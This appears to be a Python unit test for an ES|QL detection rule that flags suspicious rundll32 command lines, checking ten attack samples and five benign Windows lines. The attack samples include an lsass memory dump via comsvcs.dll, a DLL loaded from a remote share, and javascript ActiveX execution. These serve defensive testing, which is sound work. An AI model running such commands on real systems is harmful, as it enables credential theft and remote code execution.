"""
Unit tests for detections/after/T1218.011-rundll32-suspicious.esql.

Each case is one command line run through the rule's own logic with ES|QL ROW, so no event data
is needed: only a running Elasticsearch. The logic is read from the .esql file itself (everything
from "| EVAL cl" through "| WHERE COALESCE"), so the tests always exercise the rule as committed.

10 malicious lines cover every branch (A path, B entry point, C script/ordinal, D empty).
5 benign lines are real shapes Windows produced in the lab and must NOT fire.

Usage:
    python tests/test_rundll32.py

Why this exists: the first draft of branch C used a bare "#" for ordinals. "#" is reserved in
Elasticsearch (Lucene) regex and matches nothing, so `evil.dll,#1` never fired. None of the real
attacks used an ordinal; only the synthetic case below caught it.
"""
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "tools"))
from measure import esql  # noqa: E402

RULE = Path(__file__).resolve().parent.parent / "detections/after/T1218.011-rundll32-suspicious.esql"

# (expected to fire?, branch, command line)
CASES = [
    (True,  "A", r'rundll32.exe C:\Users\Public\payload.dll,Start'),
    (True,  "A", r'rundll32.exe \\10.0.0.5\share\evil.dll,EntryPoint'),
    (True,  "A", r'rundll32.exe C:\Windows\Temp\update.dll,Run'),
    (True,  "A", r'rundll32.exe shell32.dll,Control_RunDLL "C:\AtomicRedTeam\atomics\T1047\bin\calc.dll"'),
    (True,  "B", r'rundll32.exe url.dll,FileProtocolHandler calc.exe'),
    (True,  "B", r'rundll32.exe comsvcs.dll MiniDump 624 lsass.dmp full'),
    (True,  "B", r'rundll32.exe advpack.dll,LaunchINFSection payload.inf,DefaultInstall_SingleUser,1,'),
    (True,  "C", r'rundll32.exe javascript:eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\")")'),
    (True,  "C", r'rundll32.exe evil.dll,#1'),
    (True,  "D", r'rundll32.exe'),
    (False, "-", r'C:\Windows\system32\rundll32.exe advapi32.dll,ProcessIdleTasks'),
    (False, "-", r'C:\Windows\System32\rundll32.exe C:\Windows\System32\inetcpl.cpl,ClearMyTracksByProcess 8'),
    (False, "-", r'"C:\Windows\System32\rundll32.exe" C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6}'),
    (False, "-", r'C:\Windows\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations'),
    (False, "-", r'C:\Windows\system32\rundll32.exe Windows.StateRepositoryClient.dll,StateRepositoryDoMaintenanceTasks'),
]


def rule_logic():
    """The rule's EVAL ... WHERE COALESCE lines, with // comments removed."""
    text = re.sub(r"(?m)^\s*//.*\n", "", RULE.read_text())
    m = re.search(r"\| EVAL cl = .*?\| WHERE COALESCE\(.*?\n", text, re.S)
    if not m:
        sys.exit(f"Could not find the EVAL ... WHERE COALESCE block in {RULE}")
    return m.group(0)


def fires(command_line, logic):
    if '"""' in command_line:
        raise ValueError("command line cannot contain triple quotes")
    query = f'ROW process.command_line = """{command_line}"""\n{logic}| KEEP cl'
    return len(esql(query)) > 0


def main():
    logic = rule_logic()
    failures = 0
    for expected, branch, cl in CASES:
        got = fires(cl, logic)
        ok = got == expected
        failures += not ok
        print(f"{'PASS' if ok else 'FAIL'}  [{branch}] expect={'alert' if expected else 'quiet':5}  {cl}")
    print(f"\n{len(CASES) - failures}/{len(CASES)} passed")
    sys.exit(1 if failures else 0)


if __name__ == "__main__":
    main()
